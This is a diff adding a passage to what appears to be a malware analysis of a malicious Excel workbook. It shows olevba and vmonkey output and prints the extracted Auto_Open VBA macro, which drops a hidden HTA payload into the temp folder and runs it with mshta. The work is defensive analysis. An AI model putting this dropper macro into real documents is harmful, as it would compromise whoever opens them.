@@ -73,3 +73,73 @@ Relationships       |                    |          |such as remote templates,
                     |                    |          |remote OLE objects, etc   
 --------------------+--------------------+----------+--------------------------
 ```
+
+Used olevba to exract the malicious vba code. 
+```
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
+|AutoExec  |Label1_Click        |Runs when the file is opened and ActiveX     |
+|          |                    |objects trigger events                       |
+|Suspicious|Environ             |May read system environment variables        |
+|Suspicious|Open                |May open a file                              |
+|Suspicious|Write               |May write to a file (if combined with Open)  |
+|Suspicious|Output              |May write to a file (if combined with Open)  |
+|Suspicious|Shell               |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
+|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
+|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|IOC       |LwTHLrGh.hta        |Executable file name                         |
++----------+--------------------+---------------------------------------------+
+```
+
+
+```vb
+Sub Auto_Open()
+    Dim fHdswUyK, GgyYKuJh
+    Application.Goto ("JLprrpFr")
+    GgyYKuJh = Environ("temp") & "\LwTHLrGh.hta"
+    
+    Open GgyYKuJh For Output As #1
+    Write #1, hdYJNJmt(ActiveSheet.Shapes(2).AlternativeText & UZdcUQeJ.yTJtzjKX & Selection)
+    Close #1
+    
+    fHdswUyK = "msh" & "ta " & GgyYKuJh
+    x = Shell(fHdswUyK, 1)
+End Sub
+```
+
+
+by running a `vmonkey` i determine this:
+```
++----------------------+-----------------------------------------------+---------------------------------+
+| Action               | Parameters                                    | Description                     |
++----------------------+-----------------------------------------------+---------------------------------+
+| Start Regular        |                                               | All wildcard matches will match |
+| Emulation            |                                               |                                 |
+| Found Entry Point    | auto_open                                     |                                 |
+| Object.Method Call   | ['JLprrpFr']                                  | Application.Goto                |
+| Environ              | ['temp']                                      | Interesting Function Call       |
+| OPEN                 | C:\Users\admin\AppData\Local\Temp\LwTHLrGh.ht | Open File                       |
+|                      | a                                             |                                 |
+| Object.Method Call   | [-2147221504, '', '']                         | Err.Raise                       |
+| Dropped File Hash    | 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1 | File Name: LwTHLrGh.hta         |
+|                      | d49c01e52ddb7875b4b                           |                                 |
+| Execute Command      | mshta C:\Users\admin\AppData\Local\Temp\LwTHL | Shell function                  |
+|                      | rGh.hta                                       |                                 |
+| Found Entry Point    | label1_click                                  |                                 |
+| Found Entry Point    | Label1_Click                                  |                                 |
++----------------------+-----------------------------------------------+---------------------------------+
+```
+
+
+i ran a malicious excel file in sandbox and extracted a `LwTHLrGh.hta` file.
+`
